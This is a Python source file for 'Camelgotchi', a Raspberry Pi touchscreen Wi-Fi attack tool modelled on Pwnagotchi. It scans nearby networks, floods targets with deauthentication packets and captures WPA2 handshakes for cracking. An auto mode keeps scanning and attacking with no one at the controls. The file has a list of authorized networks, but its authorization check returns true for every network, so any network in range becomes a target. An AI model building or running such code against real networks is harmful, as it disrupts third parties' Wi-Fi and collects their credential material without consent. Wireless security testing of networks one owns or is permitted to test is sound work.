#!/usr/bin/env python3
"""
Camelgotchi - Enhanced Pwnagotchi for 5GHz WiFi Security Testing
For Raspberry Pi 4B + 3.5" TFT Touchscreen + AWUS1900

Features:
- Classic Pwnagotchi ASCII faces
- Touchscreen UI optimized for 480x320
- AI-powered attack selection (Q-Learning)
- Dual-band support (2.4GHz + 5GHz) via AWUS1900
- WPA2 handshake capture
- Auto mode for continuous scanning/attacking
"""

import tkinter as tk
from tkinter import ttk
import subprocess
import threading
import time
import os
import re
import random
import sqlite3
from datetime import datetime
from pathlib import Path

# ============================================================
# CONFIGURATION
# ============================================================
CONFIG = {
    "interface": "wlan0",  # Your monitor-capable adapter
    "captures_dir": os.path.expanduser("~/captures"),
    "db_path": os.path.expanduser("~/camelgotchi.db"),

    # Add your authorized networks here
    "authorized_networks": {
        # "MyNetwork": {
        #     "bssid": "AA:BB:CC:DD:EE:FF",
        #     "ssid": "MyNetwork",
        #     "channel": 36,
        # },
    }
}

# ============================================================
# PWNAGOTCHI FACES (ASCII)
# ============================================================
FACES = {
    "happy":        "(◕‿◕)",
    "excited":      "(◕‿◕)!",
    "cool":         "(⌐■_■)",
    "intense":      "(°▃°)",
    "bored":        "(≖_≖)",
    "sad":          "(◕︵◕)",
    "sleeping":     "(-.-)zzZ",
    "look_r":       "(◕‿◕ )",
    "look_l":       "( ◕‿◕)",
    "smart":        "(◕‿◕)b",
    "friend":       "(♥‿♥)",
    "angry":        "(╬ Ò﹏Ó)",
    "broken":       "(☓‿☓)",
    "debug":        "(#__#)",
    "upload":       "(1__0)",
    "grateful":     "(^‿^)",
    "motivated":    "(☼‿☼)",
    "demotivated":  "(≖__≖)",
    "lonely":       "(ب__ب)",
    "awake":        "(◕‿◕)",
}

# ============================================================
# COLOR SCHEME
# ============================================================
COLORS = {
    "bg":           "#000000",
    "bg_panel":     "#0d0d0d",
    "bg_button":    "#1a1a1a",
    "bg_hover":     "#2a2a2a",
    "primary":      "#00ff41",
    "secondary":    "#00d4ff",
    "accent":       "#ff0080",
    "warning":      "#ffaa00",
    "danger":       "#ff3333",
    "text":         "#ffffff",
    "text_dim":     "#666666",
    "border":       "#333333",
}

# ============================================================
# DATABASE
# ============================================================
class Database:
    def __init__(self, db_path):
        self.db_path = db_path
        self.init_db()

    def init_db(self):
        os.makedirs(os.path.dirname(self.db_path) if os.path.dirname(self.db_path) else ".", exist_ok=True)
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS handshakes
                     (id INTEGER PRIMARY KEY, bssid TEXT, ssid TEXT,
                      timestamp TEXT, attack_type TEXT, file_path TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS stats
                     (id INTEGER PRIMARY KEY, key TEXT UNIQUE, value TEXT)''')
        conn.commit()
        conn.close()

    def add_handshake(self, bssid, ssid, attack_type, file_path):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("INSERT INTO handshakes (bssid, ssid, timestamp, attack_type, file_path) VALUES (?, ?, ?, ?, ?)",
                  (bssid, ssid, datetime.now().isoformat(), attack_type, file_path))
        conn.commit()
        conn.close()

    def get_handshake_count(self):
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM handshakes")
            count = c.fetchone()[0]
            conn.close()
            return count
        except:
            return 0

    def get_stat(self, key, default="0"):
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute("SELECT value FROM stats WHERE key = ?", (key,))
            row = c.fetchone()
            conn.close()
            return row[0] if row else default
        except:
            return default

    def set_stat(self, key, value):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO stats (key, value) VALUES (?, ?)", (key, str(value)))
        conn.commit()
        conn.close()

# ============================================================
# WIFI SCANNER
# ============================================================
class WiFiScanner:
    def __init__(self, interface):
        self.interface = interface
        self.mon_interface = interface
        self.networks = []
        self.scanning = False

    def enable_monitor_mode(self):
        try:
            subprocess.run(["sudo", "airmon-ng", "check", "kill"],
                          capture_output=True, timeout=30)
            time.sleep(1)
            subprocess.run(["sudo", "airmon-ng", "start", self.interface],
                          capture_output=True, text=True, timeout=30)
            if os.path.exists(f"/sys/class/net/{self.interface}mon"):
                self.mon_interface = self.interface + "mon"
            else:
                self.mon_interface = self.interface
            return True
        except Exception as e:
            print(f"Monitor mode error: {e}")
            self.mon_interface = self.interface
            return False

    def disable_monitor_mode(self):
        try:
            subprocess.run(["sudo", "airmon-ng", "stop", self.interface + "mon"],
                          capture_output=True, timeout=30)
            subprocess.run(["sudo", "airmon-ng", "stop", self.interface],
                          capture_output=True, timeout=30)
        except:
            pass

    def scan_networks(self, duration=12):
        self.networks = []
        self.scanning = True

        try:
            temp_file = "/tmp/pwn_scan"
            for f in Path("/tmp").glob("pwn_scan*"):
                try: f.unlink()
                except: pass

            iface = getattr(self, 'mon_interface', self.interface)
            print(f"Scanning on: {iface}")

            process = subprocess.Popen(
                ["sudo", "airodump-ng", "-w", temp_file, "--output-format", "csv", iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

            time.sleep(duration)
            process.terminate()
            try: process.wait(timeout=5)
            except: process.kill()

            csv_file = temp_file + "-01.csv"
            if os.path.exists(csv_file):
                self.networks = self._parse_csv(csv_file)
                print(f"Found {len(self.networks)} networks")
                for n in self.networks[:5]:
                    print(f"  - {n.get('ssid', 'Hidden')} ({n.get('bssid')})")
                os.remove(csv_file)
            else:
                print("No CSV file created - airodump may have failed")

            for f in Path("/tmp").glob("pwn_scan*"):
                try: f.unlink()
                except: pass

        except Exception as e:
            print(f"Scan error: {e}")

        self.scanning = False
        return self.networks

    def _parse_csv(self, csv_file):
        networks = []
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                lines = f.readlines()

            in_ap = False
            for line in lines:
                line = line.strip()
                if line.startswith("BSSID"):
                    in_ap = True
                    continue
                if line.startswith("Station MAC"):
                    break
                if in_ap and line and ',' in line:
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14:
                        bssid = parts[0]
                        if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                            networks.append({
                                "bssid": bssid.upper(),
                                "channel": int(parts[3]) if parts[3].strip().isdigit() else 0,
                                "power": int(parts[8]) if parts[8].strip().lstrip('-').isdigit() else -100,
                                "encryption": parts[5].strip(),
                                "ssid": parts[13].strip() if len(parts) > 13 else "Hidden",
                            })
        except Exception as e:
            print(f"Parse error: {e}")
        return networks

# ============================================================
# ATTACK ENGINE
# ============================================================
class AttackEngine:
    def __init__(self, interface, captures_dir):
        self.interface = interface
        self.captures_dir = captures_dir
        self.attacking = False
        self.progress = 0
        self.current_attack = ""
        os.makedirs(captures_dir, exist_ok=True)

    def ensure_monitor_mode(self):
        try:
            print("Killing interfering processes...")
            subprocess.run(["sudo", "airmon-ng", "check", "kill"],
                          capture_output=True, timeout=30)
            time.sleep(1)

            result = subprocess.run(["iw", "dev", self.interface, "info"],
                                   capture_output=True, text=True, timeout=10)
            if "type monitor" in result.stdout:
                print(f"{self.interface} already in monitor mode")
                return True

            print(f"Enabling monitor mode on {self.interface}...")
            subprocess.run(["sudo", "ip", "link", "set", self.interface, "down"],
                          capture_output=True, timeout=10)
            subprocess.run(["sudo", "iw", "dev", self.interface, "set", "type", "monitor"],
                          capture_output=True, timeout=10)
            subprocess.run(["sudo", "ip", "link", "set", self.interface, "up"],
                          capture_output=True, timeout=10)
            return True
        except Exception as e:
            print(f"Monitor mode error: {e}")
            return False

    def handshake_attack(self, target, callback=None):
        self.attacking = True
        self.current_attack = "HANDSHAKE"
        self.progress = 0

        bssid = target["bssid"]
        channel = target["channel"]
        ssid = target.get("ssid", "Unknown")
        safe_ssid = re.sub(r'[^a-zA-Z0-9_-]', '_', ssid)

        iface = self.interface
        if os.path.exists("/sys/class/net/wlan0mon"):
            iface = "wlan0mon"
        elif os.path.exists(f"/sys/class/net/{self.interface}mon"):
            iface = f"{self.interface}mon"

        print(f"[ATTACK] Using interface: {iface}")

        try:
            print(f"[ATTACK] Setting channel {channel}...")
            subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(channel)],
                        capture_output=True, timeout=10)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            capture_file = f"{self.captures_dir}/hs_{safe_ssid}_{timestamp}"

            print(f"[ATTACK] Starting capture: {capture_file}")
            print(f"[ATTACK] Target: {ssid} ({bssid}) on channel {channel}")

            airodump = subprocess.Popen(
                ["sudo", "airodump-ng", "-c", str(channel), "--bssid", bssid,
                "-w", capture_file, "--output-format", "pcap", iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

            self.progress = 10
            if callback: callback("Listening...")
            time.sleep(5)

            for wave in range(4):
                self.progress = 15 + (wave * 20)
                if callback: callback(f"Deauth {wave+1}/4...")
                print(f"[ATTACK] Sending deauth wave {wave+1}...")

                subprocess.run(
                    ["sudo", "aireplay-ng", "--deauth", "15", "-a", bssid, iface],
                    capture_output=True, timeout=30
                )
                time.sleep(8)

            self.progress = 85
            if callback: callback("Waiting for handshake...")
            time.sleep(10)

            self.progress = 95
            airodump.terminate()
            try:
                airodump.wait(timeout=5)
            except:
                airodump.kill()

            time.sleep(2)

            cap_file = capture_file + "-01.cap"
            print(f"[ATTACK] Checking for: {cap_file}")

            if os.path.exists(cap_file):
                file_size = os.path.getsize(cap_file)
                print(f"[ATTACK] Capture file size: {file_size} bytes")

                if file_size > 0:
                    result = subprocess.run(
                        ["sudo", "aircrack-ng", cap_file],
                        capture_output=True, text=True, timeout=30
                    )
                    print(f"[ATTACK] Aircrack output: {result.stdout[:500]}")

                    if "1 handshake" in result.stdout or "WPA" in result.stdout:
                        self.progress = 100
                        if callback: callback("GOT IT!")
                        self.attacking = False
                        return True, cap_file
                    else:
                        if callback: callback("No handshake yet")
                else:
                    if callback: callback("Empty capture")
                    print("[ATTACK] Capture file is empty!")
            else:
                if callback: callback("No capture file")
                print(f"[ATTACK] Capture file not found")
                import glob
                files = glob.glob(f"{capture_file}*")
                print(f"[ATTACK] Files created: {files}")

            self.progress = 100

        except Exception as e:
            print(f"[ATTACK] Error: {e}")
            if callback: callback(f"Error: {e}")

        self.attacking = False
        return False, None

# ============================================================
# AI ENGINE (Q-Learning)
# ============================================================
class AIEngine:
    def __init__(self):
        self.q_table = {}
        self.attacks = ["handshake", "pmkid", "deauth"]

    def choose_attack(self, network):
        power = network.get("power", -100)
        if power > -50:
            return "handshake"
        elif power > -70:
            return random.choice(["handshake", "pmkid"])
        else:
            return "handshake"

    def update(self, network, attack, success):
        state = f"{network.get('power', -100)}_{network.get('encryption', 'WPA2')}"
        if state not in self.q_table:
            self.q_table[state] = {a: 0 for a in self.attacks}
        reward = 100 if success else -10
        self.q_table[state][attack] = self.q_table[state].get(attack, 0) + 0.1 * reward

# ============================================================
# GUI
# ============================================================
class CamelgotchiApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("CAMELGOTCHI")
        self.root.configure(bg=COLORS["bg"])
        self.root.attributes('-fullscreen', True)
        self.root.geometry("480x320")

        self.db = Database(CONFIG["db_path"])
        self.scanner = WiFiScanner(CONFIG["interface"])
        self.attack_engine = AttackEngine(CONFIG["interface"], CONFIG["captures_dir"])
        self.ai = AIEngine()

        self.level = int(self.db.get_stat("level", "1"))
        self.xp = int(self.db.get_stat("xp", "0"))
        self.handshakes = self.db.get_handshake_count()
        self.current_target = None
        self.face = "awake"
        self.status = "Ready"
        self.auto_mode = False
        self.channel = "-"

        self.build_ui()
        self.update_loop()

    def build_ui(self):
        self.main = tk.Frame(self.root, bg=COLORS["bg"])
        self.main.pack(fill=tk.BOTH, expand=True, padx=8, pady=5)

        # Top bar
        top = tk.Frame(self.main, bg=COLORS["bg_panel"], height=45)
        top.pack(fill=tk.X, pady=(0, 5))
        top.pack_propagate(False)

        self.face_label = tk.Label(
            top, text=FACES[self.face], font=("Courier", 18, "bold"),
            bg=COLORS["bg_panel"], fg=COLORS["primary"]
        )
        self.face_label.pack(side=tk.LEFT, padx=10)

        tk.Label(
            top, text="CAMELGOTCHI", font=("Courier", 14, "bold"),
            bg=COLORS["bg_panel"], fg=COLORS["primary"]
        ).pack(side=tk.LEFT, padx=5)

        stats = tk.Frame(top, bg=COLORS["bg_panel"])
        stats.pack(side=tk.RIGHT, padx=10)

        self.level_lbl = tk.Label(
            stats, text=f"LVL:{self.level}", font=("Courier", 10, "bold"),
            bg=COLORS["bg_panel"], fg=COLORS["secondary"]
        )
        self.level_lbl.pack(side=tk.LEFT, padx=8)

        self.hs_lbl = tk.Label(
            stats, text=f"HS:{self.handshakes}", font=("Courier", 10, "bold"),
            bg=COLORS["bg_panel"], fg=COLORS["accent"]
        )
        self.hs_lbl.pack(side=tk.LEFT, padx=8)

        # Target info
        target_frame = tk.Frame(self.main, bg=COLORS["bg_panel"], height=70)
        target_frame.pack(fill=tk.X, pady=3)
        target_frame.pack_propagate(False)

        self.target_name = tk.Label(
            target_frame, text="[ NO TARGET ]", font=("Courier", 14, "bold"),
            bg=COLORS["bg_panel"], fg=COLORS["text"]
        )
        self.target_name.pack(pady=(8, 2))

        self.target_info = tk.Label(
            target_frame, text="Scan to find networks", font=("Courier", 9),
            bg=COLORS["bg_panel"], fg=COLORS["text_dim"]
        )
        self.target_info.pack()

        self.ai_suggest = tk.Label(
            target_frame, text="", font=("Courier", 9, "italic"),
            bg=COLORS["bg_panel"], fg=COLORS["secondary"]
        )
        self.ai_suggest.pack()

        # Progress bar
        prog_frame = tk.Frame(self.main, bg=COLORS["bg"], height=20)
        prog_frame.pack(fill=tk.X, pady=3)

        self.prog_canvas = tk.Canvas(
            prog_frame, height=12, bg=COLORS["bg_panel"],
            highlightthickness=1, highlightbackground=COLORS["border"]
        )
        self.prog_canvas.pack(fill=tk.X)
        self.prog_bar = self.prog_canvas.create_rectangle(0, 0, 0, 12, fill=COLORS["primary"], width=0)

        # Buttons
        btn_frame = tk.Frame(self.main, bg=COLORS["bg"])
        btn_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        btn_frame.columnconfigure(0, weight=1)
        btn_frame.columnconfigure(1, weight=1)
        btn_frame.columnconfigure(2, weight=1)
        btn_frame.rowconfigure(0, weight=1)
        btn_frame.rowconfigure(1, weight=1)

        btn_cfg = {"font": ("Courier", 11, "bold"), "relief": tk.FLAT, "cursor": "hand2", "bd": 0}

        self.scan_btn = tk.Button(
            btn_frame, text="[SCAN]", bg=COLORS["secondary"], fg=COLORS["bg"],
            activebackground=COLORS["bg_hover"], command=self.do_scan, **btn_cfg
        )
        self.scan_btn.grid(row=0, column=0, padx=3, pady=3, sticky="nsew")

        self.auto_btn = tk.Button(
            btn_frame, text="[AUTO]", bg=COLORS["primary"], fg=COLORS["bg"],
            activebackground=COLORS["bg_hover"], command=self.toggle_auto, **btn_cfg
        )
        self.auto_btn.grid(row=0, column=1, padx=3, pady=3, sticky="nsew")

        self.attack_btn = tk.Button(
            btn_frame, text="[ATTACK]", bg=COLORS["accent"], fg=COLORS["text"],
            activebackground=COLORS["bg_hover"], command=self.do_attack, **btn_cfg
        )
        self.attack_btn.grid(row=0, column=2, padx=3, pady=3, sticky="nsew")

        self.targets_btn = tk.Button(
            btn_frame, text="[TARGETS]", bg=COLORS["bg_button"], fg=COLORS["text"],
            activebackground=COLORS["bg_hover"], command=self.show_targets, **btn_cfg
        )
        self.targets_btn.grid(row=1, column=0, padx=3, pady=3, sticky="nsew")

        self.stats_btn = tk.Button(
            btn_frame, text="[STATS]", bg=COLORS["bg_button"], fg=COLORS["text"],
            activebackground=COLORS["bg_hover"], command=self.show_stats, **btn_cfg
        )
        self.stats_btn.grid(row=1, column=1, padx=3, pady=3, sticky="nsew")

        self.exit_btn = tk.Button(
            btn_frame, text="[EXIT]", bg=COLORS["danger"], fg=COLORS["text"],
            activebackground=COLORS["bg_hover"], command=self.exit_app, **btn_cfg
        )
        self.exit_btn.grid(row=1, column=2, padx=3, pady=3, sticky="nsew")

        # Status bar
        status_bar = tk.Frame(self.main, bg=COLORS["bg_panel"], height=28)
        status_bar.pack(fill=tk.X, side=tk.BOTTOM)
        status_bar.pack_propagate(False)

        self.status_lbl = tk.Label(
            status_bar, text=self.status, font=("Courier", 9),
            bg=COLORS["bg_panel"], fg=COLORS["text_dim"]
        )
        self.status_lbl.pack(side=tk.LEFT, padx=10, pady=5)

        self.time_lbl = tk.Label(
            status_bar, text="", font=("Courier", 9),
            bg=COLORS["bg_panel"], fg=COLORS["text_dim"]
        )
        self.time_lbl.pack(side=tk.RIGHT, padx=10, pady=5)

    def update_loop(self):
        self.time_lbl.config(text=datetime.now().strftime("%H:%M:%S"))
        self.face_label.config(text=FACES.get(self.face, FACES["awake"]))
        self.status_lbl.config(text=self.status)
        self.level_lbl.config(text=f"LVL:{self.level}")
        self.hs_lbl.config(text=f"HS:{self.handshakes}")

        if self.attack_engine.attacking:
            width = int(460 * self.attack_engine.progress / 100)
            self.prog_canvas.coords(self.prog_bar, 0, 0, width, 12)

        self.root.after(500, self.update_loop)

    def set_face(self, face_name):
        self.face = face_name if face_name in FACES else "awake"

    def set_status(self, text):
        self.status = text

    def add_xp(self, amount):
        self.xp += amount
        needed = self.level * 100
        if self.xp >= needed:
            self.xp -= needed
            self.level += 1
            self.db.set_stat("level", self.level)
            self.set_status(f"LEVEL UP! Now level {self.level}")
            self.set_face("excited")
        self.db.set_stat("xp", self.xp)

    def is_authorized(self, net):
        # TESTING MODE - all networks authorized
        # For production, check against CONFIG["authorized_networks"]
        return True

    def update_target_display(self):
        if self.current_target:
            ssid = self.current_target.get("ssid", "Hidden")
            bssid = self.current_target.get("bssid", "?")
            ch = self.current_target.get("channel", 0)
            pwr = self.current_target.get("power", -100)

            self.target_name.config(text=f"[ {ssid} ]", fg=COLORS["primary"])
            self.target_info.config(text=f"{bssid} | CH:{ch} | {pwr}dBm")

            attack = self.ai.choose_attack(self.current_target)
            self.ai_suggest.config(text=f"AI > {attack.upper()}")
        else:
            self.target_name.config(text="[ NO TARGET ]", fg=COLORS["text"])
            self.target_info.config(text="Scan to find networks")
            self.ai_suggest.config(text="")

    def do_scan(self):
        if self.scanner.scanning or self.attack_engine.attacking:
            return

        self.set_status("Enabling monitor mode...")
        self.set_face("look_r")
        self.scan_btn.config(state=tk.DISABLED)

        def scan_thread():
            self.scanner.enable_monitor_mode()
            self.set_status("Scanning...")
            self.set_face("intense")

            networks = self.scanner.scan_networks(duration=12)
            auth_nets = [n for n in networks if self.is_authorized(n)]

            if auth_nets:
                self.current_target = auth_nets[0]
                self.root.after(0, self.update_target_display)
                self.set_status(f"Found {len(auth_nets)} authorized")
                self.set_face("happy")
            else:
                self.set_status(f"Found {len(networks)} (0 authorized)")
                self.set_face("bored")

            self.root.after(0, lambda: self.scan_btn.config(state=tk.NORMAL))

        threading.Thread(target=scan_thread, daemon=True).start()

    def do_attack(self):
        if not self.current_target:
            self.set_status("No target! Scan first.")
            self.set_face("bored")
            return

        if self.attack_engine.attacking:
            return

        if not self.is_authorized(self.current_target):
            self.set_status("NOT AUTHORIZED!")
            self.set_face("angry")
            return

        self.set_status("Attacking...")
        self.set_face("intense")
        self.attack_btn.config(state=tk.DISABLED)
        self.prog_canvas.coords(self.prog_bar, 0, 0, 0, 12)

        def attack_thread():
            def cb(msg):
                self.set_status(msg)

            attack_type = self.ai.choose_attack(self.current_target)
            success, file_path = self.attack_engine.handshake_attack(self.current_target, cb)
            self.ai.update(self.current_target, attack_type, success)

            if success:
                self.handshakes += 1
                self.db.add_handshake(
                    self.current_target["bssid"],
                    self.current_target.get("ssid", "Unknown"),
                    attack_type, file_path
                )
                self.add_xp(50)
                self.set_status("HANDSHAKE CAPTURED!")
                self.set_face("excited")
            else:
                self.set_status("No handshake captured")
                self.set_face("sad")

            self.root.after(0, lambda: self.attack_btn.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.prog_canvas.coords(self.prog_bar, 0, 0, 0, 12))

        threading.Thread(target=attack_thread, daemon=True).start()

    def toggle_auto(self):
        self.auto_mode = not self.auto_mode
        if self.auto_mode:
            self.auto_btn.config(bg=COLORS["danger"], text="[STOP]")
            self.set_status("Auto mode ON")
            self.set_face("motivated")
            self.run_auto()
        else:
            self.auto_btn.config(bg=COLORS["primary"], text="[AUTO]")
            self.set_status("Auto mode OFF")
            self.set_face("awake")

    def run_auto(self):
        if not self.auto_mode:
            return
        if not self.attack_engine.attacking and not self.scanner.scanning:
            if self.current_target and self.is_authorized(self.current_target):
                self.do_attack()
            else:
                self.do_scan()
        self.root.after(25000, self.run_auto)

    def show_targets(self):
        if not self.scanner.networks:
            self.set_status("Scan first!")
            return

        popup = tk.Toplevel(self.root)
        popup.title("Targets")
        popup.geometry("450x260")
        popup.configure(bg=COLORS["bg"])
        popup.transient(self.root)

        tk.Label(
            popup, text="[ NETWORKS ]", font=("Courier", 12, "bold"),
            bg=COLORS["bg"], fg=COLORS["primary"]
        ).pack(pady=8)

        listbox = tk.Listbox(
            popup, bg=COLORS["bg_panel"], fg=COLORS["text"],
            font=("Courier", 9), selectmode=tk.SINGLE,
            selectbackground=COLORS["primary"], selectforeground=COLORS["bg"],
            highlightthickness=0, bd=0
        )
        listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        for net in self.scanner.networks:
            auth = "+" if self.is_authorized(net) else "-"
            ssid = net.get("ssid", "Hidden")[:18]
            pwr = net.get("power", -100)
            ch = net.get("channel", 0)
            listbox.insert(tk.END, f"[{auth}] {ssid:18} CH:{ch:3} {pwr}dBm")

        def select():
            sel = listbox.curselection()
            if sel:
                self.current_target = self.scanner.networks[sel[0]]
                self.update_target_display()
                self.set_status("Target selected")
                self.set_face("happy")
            popup.destroy()

        tk.Button(
            popup, text="[SELECT]", font=("Courier", 11, "bold"),
            bg=COLORS["primary"], fg=COLORS["bg"], command=select
        ).pack(pady=8)

    def show_stats(self):
        popup = tk.Toplevel(self.root)
        popup.title("Stats")
        popup.geometry("450x260")
        popup.configure(bg=COLORS["bg"])
        popup.transient(self.root)

        stats_text = f"""
[ CAMELGOTCHI STATS ]

Level:       {self.level}
XP:          {self.xp} / {self.level * 100}
Handshakes:  {self.handshakes}
AI States:   {len(self.ai.q_table)}

Interface:   {CONFIG['interface']}
Captures:    {CONFIG['captures_dir']}
        """

        tk.Label(
            popup, text=stats_text, font=("Courier", 10),
            bg=COLORS["bg"], fg=COLORS["text"], justify=tk.LEFT
        ).pack(padx=20, pady=15)

        tk.Button(
            popup, text="[CLOSE]", font=("Courier", 11, "bold"),
            bg=COLORS["secondary"], fg=COLORS["bg"], command=popup.destroy
        ).pack(pady=8)

    def exit_app(self):
        self.auto_mode = False
        self.scanner.disable_monitor_mode()
        self.root.destroy()

    def run(self):
        try:
            self.root.mainloop()
        except KeyboardInterrupt:
            self.exit_app()

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Run as root: sudo python3 camelgotchi.py")
        exit(1)

    print("=" * 40)
    print("  CAMELGOTCHI")
    print("  WiFi Security Testing Tool")
    print("=" * 40)
    print(f"Interface: {CONFIG['interface']}")
    print(f"Captures:  {CONFIG['captures_dir']}")
    print()

    app = CamelgotchiApp()
    app.run()
